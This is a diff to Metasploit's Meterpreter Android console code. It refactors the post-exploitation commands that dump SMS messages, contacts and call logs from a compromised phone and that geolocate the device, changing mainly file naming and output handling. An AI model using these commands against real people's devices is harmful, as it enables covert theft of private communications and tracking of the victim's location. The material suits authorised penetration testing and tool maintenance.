@@ -80,7 +80,7 @@ class Console::CommandDispatcher::Android
   
   def cmd_dump_sms(*args)
 
-    path = 'sms_dump_' + Rex::Text.rand_text_alpha(8) + '.txt'
+    path = "sms_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"
     dump_sms_opts = Rex::Parser::Arguments.new(
         '-h' => [ false, 'Help Banner' ],
         '-o' => [ false, 'Output path for sms list']
@@ -119,7 +119,7 @@ class Console::CommandDispatcher::Android
 
         smsList.each_with_index { |a, index|
 
-          data << "##{(index.to_i + 1).to_s()}\n"
+          data << "##{index.to_i + 1}\n"
 
           type = 'Unknown'
           if a['type'] == '1'
@@ -154,9 +154,8 @@ class Console::CommandDispatcher::Android
           data << "Message\t: #{a['body']}\n\n"
         }
 
-        path = store_loot("android.sms", "text/plain", client.sock.peerhost, data, "sms.txt", "Android SMS Dump")
+        ::File.write(path, data)
         print_status("Sms #{smsList.count == 1? 'message': 'messages'} saved to: #{path}")
-        Rex::Compat.open_file(path)
 
         return true
       rescue
@@ -172,7 +171,7 @@ class Console::CommandDispatcher::Android
 
   def cmd_dump_contacts(*args)
 
-    path    = 'contacts_dump_' + Rex::Text.rand_text_alpha(8) + '.txt'
+    path = "contacts_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"
     dump_contacts_opts = Rex::Parser::Arguments.new(
 
       '-h' => [ false, 'Help Banner' ],
@@ -213,7 +212,7 @@ class Console::CommandDispatcher::Android
 
         contactList.each_with_index { |c, index|
 
-          data << "##{(index.to_i + 1).to_s()}\n"
+          data << "##{index.to_i + 1}\n"
           data << "Name\t: #{c['name']}\n"
 
           if c['number'].count > 0
@@ -231,9 +230,8 @@ class Console::CommandDispatcher::Android
           data << "\n"
         }
   
-        path = store_loot("android.contacts", "text/plain", client.sock.peerhost, data, "contacts.txt", "Android Contacts Dump")
+        ::File.write(path, data)
         print_status("Contacts list saved to: #{path}")
-        Rex::Compat.open_file(path)
 
         return true
       rescue
@@ -271,15 +269,15 @@ class Console::CommandDispatcher::Android
     geo = client.android.geolocate
 
     print_status('Current Location:')
-    print_line("\tLatitude  : #{geo[0]['lat']}")
-    print_line("\tLongitude : #{geo[0]['long']}\n")
-    print_line("To get the address: https://maps.googleapis.com/maps/api/geocode/json?latlng=#{geo[0]['lat']},#{geo[0]['long']}&sensor=true\n")
+    print_line("\tLatitude:  #{geo[0]['lat']}")
+    print_line("\tLongitude: #{geo[0]['long']}\n")
+    print_line("To get the address: https://maps.googleapis.com/maps/api/geocode/json?latlng=#{geo[0]['lat'].to_f},#{geo[0]['long'].to_f}&sensor=true\n")
 
 
     if generate_map
-      link = "https://maps.google.com/maps?q=#{geo[0]['lat']},#{geo[0]['long']}"
-      print_status('Generated map on google-maps:')
-      print_status('#{link}')
+      link = "https://maps.google.com/maps?q=#{geo[0]['lat'].to_f},#{geo[0]['long'].to_f}"
+      print_status("Generated map on google-maps:")
+      print_status(link)
       Rex::Compat.open_browser(link)
     end
 
@@ -287,7 +285,7 @@ class Console::CommandDispatcher::Android
 
   def cmd_dump_calllog(*args)
 
-    path = 'dump_calllog_' + Rex::Text.rand_text_alpha(8) + '.txt'
+    path = "calllog_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"
     dump_calllog_opts = Rex::Parser::Arguments.new(
 
       '-h' => [ false, 'Help Banner' ],
@@ -327,7 +325,7 @@ class Console::CommandDispatcher::Android
 
         log.each_with_index { |a, index|
 
-          data << "##{(index.to_i + 1).to_s()}\n"
+          data << "##{index.to_i + 1}\n"
 
           data << "Number\t: #{a['number']}\n"
           data << "Name\t: #{a['name']}\n"
@@ -336,9 +334,8 @@ class Console::CommandDispatcher::Android
           data << "Duration: #{a['duration']}\n\n"
         }
 
-        path = store_loot("android.calllog", "text/plain", client.sock.peerhost, data, "call-log.txt", "Android Call Log Dump")
+        ::File.write(path, data)
         print_status("Call log saved to #{path}")
-        Rex::Compat.open_file(path)
 
         return true
       rescue
